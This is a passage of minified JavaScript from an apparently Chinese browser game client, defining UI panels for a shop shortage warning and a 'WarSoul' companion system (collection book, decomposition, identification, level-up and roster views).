o=l.Recharge.ins().getRechargeData(0);o&&0!=o.num||(n=!1,win.open("FirstChargeNew"))}n&&""!=e[1]&&win.open2(e[1],e[2],e[3]),win.close("ShopGoodsWarn")}}},e.prototype.buyCallBack=function(t){t>0?win.close("ShopGoodsWarn"):(u.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:元宝不足|")),win.close(this))},e.prototype.onTxtChange=function(t){var e=Number(this.countTxt.text);this.setTotalPrice(e)},e.prototype.setData=function(t,e){if(!this.dataArr&&(this.dataArr={}),this.dataArr.id=t,this.dataArr.num=e,this.skin){var i;if(t>100){var n=s.GlobalConfig.ItemConfig[t];this.itemIcon.data=n.id,i=h.Shop.getStoreByItemID(t),this.titleTxt.text=gettext("材料不足，通过以下方式获得")}else switch(this.itemIcon.data=null,t){case a.MoneyConst.gold:this.titleTxt.text=gettext("货币不足，通过以下方式获得");break;case a.MoneyConst.guildGx:var n=s.GlobalConfig.ItemConfig[t];this.itemIcon.data=null===n||void 0===n?void 0:n.id;break;case 7:win.close(this),this.titleTxt.text=gettext("功勋不足，通过以下方式获得");break;case 8:win.close(this),this.titleTxt.text=gettext("成就积分不足，通过以下方式获得")}var o=s.GlobalConfig.GainItemConfig[t],r=0;this.titleTxt.visible=!!o,o&&!(null===urlParam||void 0===urlParam?void 0:urlParam.isHideAllShop)?(this.arc.replaceAll(o.gainWay.concat()),r=60*o.gainWay.length):this.arc.replaceAll(null),i?(this.currentState="exist",this._goodsId=i.id,this.price.setData(i.cost),this.totalPrice.setType(i.cost.id),this.setTotalPrice(e)):this.currentState="nonexist"}},e.prototype.setTotalPrice=function(t){0>=t?this._totalNum=1:t>=1e4?this._totalNum=9999:this._totalNum=t,this.countTxt.text=this._totalNum+"";var e=h.Shop.getStoreByItemID(this.dataArr.id);e?this.totalPrice.setPrice(this._totalNum*e.cost.count):this.totalPrice.setPrice(this._totalNum*this.price.getPrice())},e}(o.BaseView);e.ShopGoodsWarn=g,window.ShopGoodsWarn=g,__reflect(g.prototype,"ShopGoodsWarn",[]),window.ShopGoodsWarn=g},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulBookPanel=void 0;var n=i(5),o=i(1),s=i(22),a=i(0),r=i(15),l=i(4),h=i(12),u=i(2),p=i(522),d=i(60),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulBookPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.bookLst.itemRenderer=p.WarSoulBookItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];d.WarSoulCT.ins().curSelBookId=0,this.observe(d.WarSoulCT.ins().postWarSoulTuJian,this.updateView),this.observe(d.WarSoulCT.ins().postWarSoulTuJianLvUp,this.updateView),this.bookLst.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onBookTap,this);var i=[];for(var n in a.GlobalConfig.WarSoulTuJianConfig){var o=a.GlobalConfig.WarSoulTuJianConfig[n];-1==i.indexOf(o.warSoulId)&&i.push(o.warSoulId)}this.bookLst.dataProvider=this.eBookArc=new eui.ArrayCollection(i),this.updateView(),d.WarSoulCT.ins().sendWarSoulTuJian()},e.prototype.updateView=function(){var t=this.eBookArc.length,e=Object.keys(d.WarSoulCT.ins().warSoulBookDic).length,i=d.WarSoulCT.ins().warSoulBookMaxLv;this.txtCollect.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("已收集战灵种类：{0}","|C:0xe6b422&T:"+(e+"/"+t)+"|")),this.txtLv.textFlow=n.TextFlowMaker.generateTextFlow1(gettext("总等级数:{0}","|C:0xe6b422&T:"+i+"|"));var o=d.WarSoulCT.ins().getWarSoulLvLimit(),s=gettext("战灵升级上限{0}","|C:0xe6b422&T:"+o+"|"),a=d.WarSoulCT.ins().getWarSoulNextLvLimit();a&&(s=s+"\n"+gettext("图鉴等级达到{0}解锁上限{1}","|C:0xe6b422&T:"+a[0]+"|","|C:0xe6b422&T:"+a[1]+"|")),this.lbLvTips.textFlow=n.TextFlowMaker.generateTextFlow1(s),this.updateBookList(),this.updateBookData()},e.prototype.updateBookList=function(){for(var t=0;t<this.bookLst.numChildren;t++){var e=this.bookLst.getChildAt(t);e.updateView()}this.updateItemSelected()},e.prototype.onBookTap=function(t){d.WarSoulCT.ins().curSelBookId=t.item,this.updateItemSelected()},e.prototype.updateItemSelected=function(){for(var t=0;t<this.bookLst.numChildren;t++){var e=this.bookLst.getChildAt(t);!d.WarSoulCT.ins().curSelBookId&&e.curWarSoulId&&(d.WarSoulCT.ins().curSelBookId=e.curWarSoulId),e.updateSelect()}},e.prototype.updateBookData=function(){var t="",e="",i=0,n=l.ActorCC.jobId,o=d.WarSoulCT.ins().warSoulBookDic,r={};for(var h in o){var u=o[h];if(u&&a.GlobalConfig.WarSoulTuJianConfig[u.bookId])for(var p=a.GlobalConfig.WarSoulTuJianConfig[u.bookId],c=0;c<p.attr.length;c++){var f=p.attr[c];s.AttributeData.checkJobAttr(f.type,n)&&(r[f.type]=r[f.type]||0,r[f.type]+=f.value)}}for(var h in r){var g=s.AttributeData.getAttrStrByTypeTotem(Number(h))+": "+s.AttributeData.getAttrValStrByType(Number(h),r[h]);g+="\n",i%2===0?t+=g:e+=g,i++}"\n"==t.slice(-1)&&(t=t.slice(0,-1)),"\n"==e.slice(-1)&&(e=e.slice(0,-1)),this.lbAttr.text=t,this.lbAttr2.text=e},e.prototype.tabRp=function(){return d.WarSoulCT.ins().bookRp.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);return i||u.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(r.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},e}(o.BaseView);e.WarSoulBookPanel=c,window.WarSoulBookPanel=c,__reflect(c.prototype,"WarSoulBookPanel",[]),window.WarSoulBookPanel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulDecomPanel=void 0;var n=i(19),o=i(1),s=i(77),a=i(0),r=i(15),l=i(12),h=i(2),u=i(523),p=i(60),d=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulDecomPanelSkin",e.selItemId=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.warSoulLst.itemRenderer=u.WarSoulDecomItem,this.warSoulLst.dataProvider=this.eArc=new eui.ArrayCollection([]),this.propList.itemRenderer=s.ItemBaseNoName,this.propList.dataProvider=this.eItemArc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.btnDecom,this.onBtnClick),this.warSoulLst.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.observe(p.WarSoulCT.ins().postWarSoulDecompose,this.onDecompose),this.updateView()},e.prototype.onDecompose=function(){this.updateView()},e.prototype.updateView=function(){this.updateList(),this.updateItemList(),this.updateCost()},e.prototype.updateList=function(){p.WarSoulCT.ins().curSelDecomIdLst=[];var t=[];for(var e in p.WarSoulCT.ins().warSoulDic){var i=p.WarSoulCT.ins().warSoulDic[e];t.push(i)}this.eArc.source=t},e.prototype.updateItemList=function(){for(var t=[],e=0;e<p.WarSoulCT.ins().curSelDecomIdLst.length;e++){var i=p.WarSoulCT.ins().warSoulDic[p.WarSoulCT.ins().curSelDecomIdLst[e]];if(i&&i.getQualityCfg())for(var n=i.getQualityCfg(),o=0,s=n.recycle;o<s.length;o++){for(var a=s[o],r=!0,l=0,h=t;l<h.length;l++){var u=h[l];if(u.type==a.type&&u.id==a.id){u.count+=a.count,r=!1;break}}if(r){var d={type:a.type,id:a.id,count:a.count};t.push(d)}}}t.length<1&&(t=[[]]),this.eItemArc.replaceAll(t)},e.prototype.onBtnClick=function(t){var e=a.GlobalConfig.WarSoulBaseConfig.recycleCost;if(e&&e[0]){var i=p.WarSoulCT.ins().curSelDecomIdLst.length*e[0].count;if(!n.GlobalFun.checkCost(i,e[0].id))return}for(var o=0;o<p.WarSoulCT.ins().curSelDecomIdLst.length;o++)p.WarSoulCT.ins().sendWarSoulDecompose(p.WarSoulCT.ins().curSelDecomIdLst[o])},e.prototype.onItemClick=function(t){if(t){var e=t.itemRenderer;if(e&&e.data){if(e.data.id==p.WarSoulCT.ins().curWarSoulId||e.data.level>1)return void h.TipsCT.ins().showTips(gettext("要分解的战灵要先下阵、重置成1级"));e.isSelect?(e.setSelect(!1),e.data&&-1!==p.WarSoulCT.ins().curSelDecomIdLst.indexOf(e.data.id)&&(p.WarSoulCT.ins().curSelDecomIdLst=p.WarSoulCT.ins().curSelDecomIdLst.filter(function(t){return t!==e.data.id}))):(e.setSelect(!0),e.data&&-1===p.WarSoulCT.ins().curSelDecomIdLst.indexOf(e.data.id)&&p.WarSoulCT.ins().curSelDecomIdLst.push(e.data.id))}}this.updateItemList(),this.updateCost()},e.prototype.updateCost=function(){var t=a.GlobalConfig.WarSoulBaseConfig.recycleCost;if(t&&t[0]){var e=p.WarSoulCT.ins().curSelDecomIdLst.length,i={type:t[0].type,id:t[0].id,count:e*t[0].count};this.cost.setData(i),this.txtSel.text=gettext("已选中{0}",e)}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);return i||h.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(r.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},__decorate([delayCall(200)],e.prototype,"onDecompose",null),e}(o.BaseView);e.WarSoulDecomPanel=d,window.WarSoulDecomPanel=d,__reflect(d.prototype,"WarSoulDecomPanel",[]),window.WarSoulDecomPanel=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulIdenPanel=void 0;var n=i(21),o=i(19),s=i(1),a=i(0),r=i(15),l=i(6),h=i(12),u=i(2),p=i(266),d=i(60),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulIdenPanelSkin",e.selItemId=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.eList.itemRenderer=p.WarSoulSkillBookItem},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(d.WarSoulCT.ins().postWarSoulIdentity,this.updateView),this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.eList,this.onListTap),this.eList.dataProvider=this.eArc=new eui.ArrayCollection([0,0,0,0,0,0]),this.updateView()},e.prototype.updateView=function(){for(var t=[],e=d.WarSoulCT.ins().getWarSoulEggIdList(),i=0,n=e;i<n.length;i++){var o=n[i],s=l.BagCT.ins().getBagItemCount(l.BagCT.BAG_TYPE_OTHTER,o);if(s){var a={type:1,id:o,count:s};t.push(a)}}for(;t.length<6;)t.push(0);this.eArc.source=t,this.updateItemSelected(),this.updateCost()},e.prototype.updateCost=function(){var t=a.GlobalConfig.WarSoulBaseConfig.goodItem;if(t){var e={type:1,id:t,count:1};this.cost.setData(e,!1);var i=a.GlobalConfig.ItemConfig[t];this.ckbUse.label=i?i.name:""}},e.prototype.onListTap=function(t){var e=this.eList.selectedItem,i=e?e.id:0;i!=this.selItemId&&(this.selItemId=e?e.id:0,this.updateItemSelected(),this.playStandEff())},e.prototype.onTap=function(t){switch(t.target){case this.btnIden:var e=this.ckbUse.selected?1:0;if(e){var i=a.GlobalConfig.WarSoulBaseConfig.goodItem;if(i&&!o.GlobalFun.checkCost(1,i))return}var n=Object.keys(d.WarSoulCT.ins().warSoulDic).length;if(n>=a.GlobalConfig.WarSoulBaseConfig.bagMax)return void u.TipsCT.ins().showTips(gettext("战灵背包已满"));d.WarSoulCT.ins().sendWarSoulIdentity(this.selItemId,e)}},e.prototype.playAtkEff=function(){var t=this,e=d.WarSoulCT.ins().getWarSoulCfgByEgg(this.selItemId);if(e){this.effWarSoul||(this.effWarSoul=new n.MovieClip,this.modelGrp.addChild(this.effWarSoul));var i=e.modelId+"_4a";this.effWarSoul.playFile(RES_DIR_MONSTER+i,1,function(){t.playStandEff()},!1),this.effWarSoul.scaleX=this.effWarSoul.scaleY=d.WarSoulCT.ins().getWarSoulModelSet(e)}},e.prototype.playStandEff=function(){var t=d.WarSoulCT.ins().getWarSoulCfgByEgg(this.selItemId);if(t){this.effWarSoul||(this.effWarSoul=new n.MovieClip,this.modelGrp.addChild(this.effWarSoul));var e=t.modelId+"_4s";this.effWarSoul.playFile(RES_DIR_MONSTER+e,-1,null,!1),this.effWarSoul.scaleX=this.effWarSoul.scaleY=d.WarSoulCT.ins().getWarSoulModelSet(t),Timer.has(this.playAtkEff,this)||Timer.start(3e3,0,this.playAtkEff,this)}},e.prototype.updateItemSelected=function(){for(var t=0;t<this.eList.numChildren;t++){var e=this.eList.getChildAt(t);e.isOpenSelectImg=!0,!this.selItemId&&e.data?(this.selItemId=e.data.id,e.setSelect(!0)):e.data&&e.data.id==this.selItemId?e.setSelect(!0):e.setSelect(!1)}this.effWarSoul||this.playStandEff()},e.prototype.tabRp=function(){return d.WarSoulCT.ins().eggRp.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);return i||u.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(r.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},__decorate([delayCall(200)],e.prototype,"updateItemSelected",null),e}(s.BaseView);e.WarSoulIdenPanel=c,window.WarSoulIdenPanel=c,__reflect(c.prototype,"WarSoulIdenPanel",[]),window.WarSoulIdenPanel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulInfoPanel=void 0;var n=i(1),o=i(0),s=i(15),a=i(12),r=i(2),l=i(267),h=i(60),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulInfoPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.skillList.itemRenderer=l.WarSoulSkillItem,this.skillList.dataProvider=this.eArc=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateView()},e.prototype.setInfo=function(t){this.info=t,this.skin&&this.updateView()},e.prototype.updateView=function(){for(var t=[],e=0;e<this.info.proSkillList.length;e++){var i={id:this.info.proSkillList[e],isPro:!0};t.push(i)}for(var e=0;e<this.info.skillList.length;e++){var i={id:this.info.skillList[e],isPro:!1};t.push(i)}this.eArc.source=t;for(var e=1;4>=e;e++){var n="0";if(this.info.attr[e]){var s=(1+(this.info.level-1)*o.GlobalConfig.WarSoulBaseConfig.attrUpVal[e])*this.info.attr[e].value,a=100+.01*this.info.attr[e].qlty,r=Math.floor(s*a*.01);n="       "+s.toFixed(2)+"   ×   "+a.toFixed(2)+"%   =   "+r}if(this["txtAttr"+e].text=h.WarSoulCT.ins().getAttrName(e)+":   "+n,this["txtQlty"+e].text=h.WarSoulCT.ins().getAttrName(e)+":",this["bar"+e].labelDisplay.visible=!0,this["bar"+e].maximum=this.info.cfg.qualityMax[e-1]?this.info.cfg.qualityMax[e-1]:100,this.info.attr[e]){this["bar"+e].value=this.info.attr[e].qlty;var l=h.WarSoulCT.ins().getValueQltyCfg(e,this.info.attr[e].value);this["qualit"+e].text=null===l||void 0===l?void 0:l.scoreName,this["qualit"+e].textColor=null===l||void 0===l?void 0:l.scoreCol}else this["bar"+e].value=0,this["qualit"+e].text=""}},e.prototype.onTap=function(t){t.currentTarget},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=a.OpenSystem.ins().checkSysOpen(s.SystemType.WarSoul);return i||r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(s.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},e}(n.BaseView);e.WarSoulInfoPanel=u,window.WarSoulInfoPanel=u,__reflect(u.prototype,"WarSoulInfoPanel",[]),window.WarSoulInfoPanel=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulSkillTipsWin=void 0;var n=i(1),o=i(0),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.skillId=0,e._sn_="WarSoulSkillTipsSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.skillItem.touchEnabled=!1},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0];if(null!=i){this.skillId=i.id,this.skillItem.data=i;var n=o.GlobalConfig.WarSoulSkillConfig[this.skillId];n&&(this.skillName.text=n.title,this.skillDes.text=n.desc,this.skillLv.text="",this.skillNext.text="")}},e.prototype.removeDisplay=function(){this.skin&&this.removeObserve()},e}(n.BaseView);e.WarSoulSkillTipsWin=s,window.WarSoulSkillTipsWin=s,__reflect(s.prototype,"WarSoulSkillTipsWin",[]),window.WarSoulSkillTipsWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulLvUpPanel=void 0;var n=i(19),o=i(1),s=i(110),a=i(0),r=i(15),l=i(12),h=i(2),u=i(60),p=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulLvUpPanelSkin",e.upLv=1,e.upLvCostArr1=[],e.upLvCostArr2=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.costCmlist.itemRenderer=s.CostComRender,this.costCmlist.dataProvider=this.costArr=new eui.ArrayCollection,this.costCmlist2.itemRenderer=s.CostComRender,this.costCmlist2.dataProvider=this.costArr2=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(u.WarSoulCT.ins().postWarSoulLvUp,this.updateView),this.addTouchEvent(this.shengjiBtn,this.onBtnClick),this.addTouchEvent(this.shengjiBtn2,this.onBtnClick),this.updateView()},e.prototype.setInfo=function(t){this.info=t,this.skin&&this.updateView()},e.prototype.updateView=function(){for(var t=1;4>=t;t++){var e="0";if(this.info.attr[t]){var i=(1+(this.info.level-1)*a.GlobalConfig.WarSoulBaseConfig.attrUpVal[t])*this.info.attr[t].value,n=100+.01*this.info.attr[t].qlty,o=Math.floor(i*n*.01);e="       "+i.toFixed(2)+"   ×   "+n.toFixed(2)+"%   =   "+o}if(this["txtAttr"+t].text=u.WarSoulCT.ins().getAttrName(t)+":   "+e,this.info.attr[t]){var s=u.WarSoulCT.ins().getValueQltyCfg(t,this.info.attr[t].value);this["qualit"+t].text=null===s||void 0===s?void 0:s.scoreName,this["qualit"+t].textColor=null===s||void 0===s?void 0:s.scoreCol}else this["qualit"+t].text=""}this.updateCost()},e.prototype.updateCost=function(){var t=a.GlobalConfig.WarSoulLvConfig[this.info.level];if(this.upLvCostArr1=[],t&&t.cost){for(var e=0,i=t.cost;e<i.length;e++){var n=i[e];this.upLvCostArr1.push({cost:{type:n.type,id:n.id,count:n.count},isShowXh:!1,isShowHas:!0})}this.costArr.replaceAll(this.upLvCostArr1)}this.upLv=0,this.shengjiBtn2.label=gettext("升{0}级",1),this.upLvCostArr2=[];for(var o=u.WarSoulCT.ins().getWarSoulLvLimit(),s=9;s>=0;s--)if(!(this.info.level+s>=o)){var r=a.GlobalConfig.WarSoulLvConfig[this.info.level+s];if(r&&r.cost){for(var l=function(t){var e=h.upLvCostArr2.filter(function(e){return e.cost.type===t.type&&e.cost.id===t.id}),i=e.length>0?e[0]:null;i?i.cost.count+=t.count:h.upLvCostArr2.push({cost:{type:t.type,id:t.id,count:t.count},isShowXh:!1,isShowHas:!0})},h=this,p=0,d=r.cost;p<d.length;p++){var n=d[p];l(n)}s+1>this.upLv&&(this.upLv=s+1,this.shengjiBtn2.label=gettext("升{0}级",s+1))}this.costArr2.replaceAll(this.upLvCostArr2)}},e.prototype.onBtnClick=function(t){if(this.info){var e=1,i=[];t.target==this.shengjiBtn?(i=this.upLvCostArr1,e=1):(i=this.upLvCostArr2,e=this.upLv);for(var o=0,s=i;o<s.length;o++){var a=s[o];if(!n.GlobalFun.checkCost(a.cost.count,a.cost.id))return}var r=u.WarSoulCT.ins().getWarSoulLvLimit();return u.WarSoulCT.ins().getWarSoulNextLvLimit()?this.info.level>=r?void h.TipsCT.ins().showTips(gettext("当前已达上限，提升图鉴等级可解锁")):void u.WarSoulCT.ins().sendWarSoulLvUp(this.info.id,e):void h.TipsCT.ins().showTips(gettext("战灵已达最大等级"))}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);return i||h.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(r.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},e}(o.BaseView);e.WarSoulLvUpPanel=p,window.WarSoulLvUpPanel=p,__reflect(p.prototype,"WarSoulLvUpPanel",[]),window.WarSoulLvUpPanel=p
},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulMainPanel=void 0;var n=i(1),o=i(17),s=i(15),a=i(12),r=i(2),l=i(60),h=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulMainPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(o.RedPointBaseSys.ins().RpChange,this.updateTabRp)},e.prototype.updateTabRp=function(){this.eTab.updateReds()},e.prototype.tabRp=function(){return l.WarSoulCT.ins().rp.v},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=a.OpenSystem.ins().checkSysOpen(s.SystemType.WarSoul);return i||r.TipsCT.ins().showTips(a.OpenSystem.ins().getNoOpenTips(s.SystemType.WarSoul)),i},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return a.OpenSystem.ins().checkSysShow(s.SystemType.WarSoul)},e.prototype.removeDisplay=function(){},e}(n.BaseView);e.WarSoulMainPanel=h,window.WarSoulMainPanel=h,__reflect(h.prototype,"WarSoulMainPanel",[]),window.WarSoulMainPanel=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulMemPanel=void 0;var n=i(21),o=i(16),s=i(1),a=i(0),r=i(15),l=i(12),h=i(2),u=i(60),p=i(524),d=i(1355),c=function(t){function e(){var e=t.call(this)||this;return e._sn_="WarSoulMemPanelSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.memList.itemRenderer=p.WarSoulMemItem,this.memList.dataProvider=this.eArc=new eui.ArrayCollection([]),this.eTab.dataProvider=new eui.ArrayCollection([{name:gettext("战力排序")},{name:gettext("品质排序")},{name:gettext("时间排序")}]),this.abShape=new egret.Shape,this.abShape.graphics.clear(),this.imgAbility.mask=this.abShape,this.imgAbility.parent.addChild(this.abShape),u.WarSoulCT.ins().sendWarSoulTuJian()},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),this.eTab.addEventListener(eui.UIEvent.CHANGE,this.onTabChange,this),this.observe(u.WarSoulCT.ins().postWarSoulInfoChange,this.updateView),this.observe(u.WarSoulCT.ins().postWarSoulInfo,this.updateView),this.observe(u.WarSoulCT.ins().postWarSoulLvUp,this.updateView),this.observe(u.WarSoulCT.ins().postWarSoulName,this.updateName),this.observe(u.WarSoulCT.ins().postWarSoulFight,this.updateListView),this.observe(u.WarSoulCT.ins().postWarSoulRestore,this.updateListView),this.addTouchEvent(this.memList,this.onListTap),u.WarSoulCT.ins().curSelWarSoulId=u.WarSoulCT.ins().curWarSoulId,this.updateView()},e.prototype.onTap=function(t){var e,i;switch(t.target){case this.btnFight:if(!u.WarSoulCT.ins().curSelWarSoulId)return void h.TipsCT.ins().showTips(gettext("当前无战灵"));if(u.WarSoulCT.ins().curSelWarSoulId==u.WarSoulCT.ins().curWarSoulId)return void h.TipsCT.ins().showTips(gettext("该战灵已出战"));u.WarSoulCT.ins().sendWarSoulFight(u.WarSoulCT.ins().curSelWarSoulId,1);break;case this.btnReset:this.curInfo&&this.curInfo.level>1?win.open(d.WarSoulWarnWin,this.curInfo):h.TipsCT.ins().showTips(gettext("战灵等级1以上才能重置"));break;case this.btn_help:win.open("CommonHelpWin",(null===(e=a.GlobalConfig.HelpInfoConfig[347])||void 0===e?void 0:e.text)||"");break;case this.btn_help0:win.open("CommonHelpWin",(null===(i=a.GlobalConfig.HelpInfoConfig[348])||void 0===i?void 0:i.text)||"")}},e.prototype.onTabChange=function(t){this.updateList()},e.prototype.updateView=function(){this.updateList(),this.updateCurInfo()},e.prototype.onListTap=function(t){var e=this.memList.selectedItem;u.WarSoulCT.ins().curSelWarSoulId=e?e:u.WarSoulCT.ins().curWarSoulId,this.updateItemSelected()},e.prototype.updateListView=function(){for(var t=0;t<this.memList.numChildren;t++){var e=this.memList.getChildAt(t);e.updateView()}},e.prototype.updateItemSelected=function(){this.updateCurInfo();for(var t=0;t<this.memList.numChildren;t++){var e=this.memList.getChildAt(t);e.updateSelectState()}},e.prototype.updateList=function(){for(var t=this.eTab.selectedIndex+1,e=u.WarSoulCT.ins().getWarSoulInfoList(t),i=[],n=0;n<e.length;n++){var o=e[n];i.push(o.id)}this.eArc.source=i,this.updateItemSelected(),this.num.text=gettext("数量：{0}",i.length+"/"+a.GlobalConfig.WarSoulBaseConfig.bagMax)},e.prototype.updateCurInfo=function(){if(this.curInfo=u.WarSoulCT.ins().getWarSoul(u.WarSoulCT.ins().curSelWarSoulId),!this.curInfo)return this.nameGrp.visible=!1,this.setAbility(),void(this.txtLevel.text="");this.setAbility(),this.effWarSoul||(this.effWarSoul=new n.MovieClip,this.modelGrp.addChild(this.effWarSoul));var t=this.curInfo.cfg;this.imgQua.source=this.curInfo.getQualityImg(),this.effWarSoul.scaleX=this.effWarSoul.scaleY=u.WarSoulCT.ins().getWarSoulModelSet(t);var e=this.curInfo.cfg.modelId+"_4s";this.effWarSoul.playFile(RES_DIR_MONSTER+e,-1,null,!1),this.txtLevel.text=gettext("等级:")+this.curInfo.level,this.updateName()},e.prototype.updateName=function(){if(this.curInfo=u.WarSoulCT.ins().getWarSoul(u.WarSoulCT.ins().curSelWarSoulId),!this.curInfo)return void(this.nameGrp.visible=!1);this.nameGrp.visible=!0,this.txtName.text=this.curInfo.name;for(var t=0;t<this.memList.numChildren;t++){var e=this.memList.getChildAt(t);e.updateView()}},e.prototype.setAbility=function(){this.abShape.graphics.clear();var t={};this.curInfo&&(t=this.curInfo.attr);for(var e=a.GlobalConfig.WarSoulBaseConfig.attrShowLimit,i=[],n=1;4>=n;n++){var s=t[n]?t[n].value:0,r=t[n]?t[n].total:0,l=e[n-1]?e[n-1]:100,h=s/l*100;h=h>100?100:h,i.push(h),this["attr"+n].text=u.WarSoulCT.ins().getAttrName(n)+":"+r}var p=o.DisplayUtils.getPolygonVertex(this.imgAbility.x+this.imgAbility.width/2,this.imgAbility.y+this.imgAbility.height/2,this.imgAbility.width/2,4,i);o.DisplayUtils.drawPolygon(this.abShape,p,4251448)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(r.SystemType.WarSoul);return i||h.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(r.SystemType.WarSoul)),i},e.prototype.removeDisplay=function(){},e}(s.BaseView);e.WarSoulMemPanel=c,window.WarSoulMemPanel=c,__reflect(c.prototype,"WarSoulMemPanel",[]),window.WarSoulMemPanel=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WarSoulWindow=void 0;var n=i(21),o=i(16),s=i(1),a=i(0),r=i(15),l=i(12),h=i(2),u=i(60),p=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.infoIdx=0,e._sn_="WarSoulWindowSkin",e.isTopLevel=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.abShape=new egret.Shape,this.abShape.graphics.clear(),this.imgAbility.mask=this.abShape,this.imgAbility.parent.addChild(this.abShape),this.addTouchEvent(this,this.onBtnTouch),this.tab.addEventListener(eui.UIEvent.CHANGE,this.onTabChange,this),this.observe(u.WarSoulCT.ins().postWarSoulLvUp,this.updateView),this.observe(u.WarSoulCT.ins().postWarSoulName,this.updateView)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.info=t[0];var i=u.WarSoulCT.ins().warSoulList;this.infoIdx=i.indexOf(this.info),this.info&&(this.tab.selectedIndex=0,this.updateView(),this.updateModel())},e.prototype.updateModel=function(){if(this.info){this.effWarSoul||(this.effWarSoul=new n.MovieClip,this.modelGrp.addChild(this.effWarSoul));var t=this.info.cfg.modelId+"_4s";this.effWarSoul.playFile(RES_DIR_MONSTER+t,-1,null,!1),this.effWarSoul.scaleX=this.effWarSoul.scaleY=u.WarSoulCT.ins().getWarSoulModelSet(this.info.cfg)}},e.prototype.setAbility=function(){if(this.abShape.graphics.clear(),this.info){for(var t=a.GlobalConfig.WarSoulBaseConfig.attrShowLimit,e=[],i=1;4>=i;i++){var n=this.info.attr[i]?this.info.attr[i].value:0,s=t[i-1]?t[i-1]:100,r=n/s*100;r=r>100?100:r,e.push(r)}var 